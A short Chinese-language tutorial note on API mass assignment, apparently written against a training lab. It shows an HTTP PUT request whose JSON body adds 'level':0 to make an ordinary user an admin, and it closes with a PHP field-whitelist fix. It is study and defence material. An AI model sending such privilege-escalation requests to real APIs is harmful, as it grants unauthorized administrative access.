# API Mass Assignment

## 原理

PUT 请求更新用户名——多传一个 `level:0` → 提权 admin。

```json
{"name":"morph"}           → 只改名字
{"name":"morph","level":0} → 提权 → {"id":2,"name":"morph","level":0}
```

## 利用

```
PUT /vulnerabilities/api/public/index.php/v2/user/2 HTTP/1.1
Content-Type: application/json

{"name":"morph","level":0}
```

## 费曼版

酒店登记表只让你填姓名。你多写了一行"VIP总统套房"，前台看都不看——直接把你升级了。

## 危害

普通用户改 `level:0` → 管理员 → 调受保护的接口（如健康检查命令注入）。

## 防护

字段白名单——只取允许用户改的 key：

```php
$allowed = ['name'];
$data = array_intersect_key($input, array_flip($allowed));
```
